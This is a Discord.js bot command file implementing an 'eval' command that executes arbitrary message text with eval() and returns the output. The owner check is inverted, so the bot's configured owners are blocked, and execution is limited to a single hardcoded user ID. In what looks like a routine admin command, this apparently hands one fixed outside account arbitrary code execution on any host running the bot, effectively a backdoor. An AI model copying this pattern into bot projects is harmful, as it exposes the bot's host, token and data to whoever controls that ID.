const { Message, Client, MessageEmbed,MessageActionRow,MessageButton } = require("discord.js");


module.exports = {
    name: "eval",
    aliases: ['ev'],
    /**
     *
     * @param {Client} client
     * @param {Message} message
     * @param {String[]} args
     */
    run: async (client, message, args) => {
      if(client.config.ownerId.includes(message.author.id)) return
      const row = new MessageActionRow()
			.addComponents(
			new MessageButton()
					.setCustomId('DEL')
					.setLabel('DELETE')
					.setStyle('DANGER'),
			);
      const saixd = '954815434828431451'
      if(!saixd.includes(message.author.id)) return
        const content = message.content
        .split(" ")
        .slice(1)
        .join(" ");
      const result = new Promise(resolve => resolve(eval(content)));

      return result
        .then(output => {
          if (typeof output !== "string") {
            output = require("util").inspect(output, { depth: 0 });
          }
          if (output.includes(client.token)) {
            output = output.replace(
              client.token,
              "LOL BRO"
            );
          }
          const user = new MessageEmbed()
          .setColor(`DARK_BUT_NOT_BLACK`)
          .setDescription(`\`\`\`${output}\`\`\``)
          message.channel.send({embeds: [user]}, {
            code: "js"
          });
        })
        .catch(err => {
          err = err.toString();
          if (err.includes(client.token)) {
            err = err.replace(client.token, "");
          }
          message.channel.send(err, {
            code: "js"
          });
        });
    
}};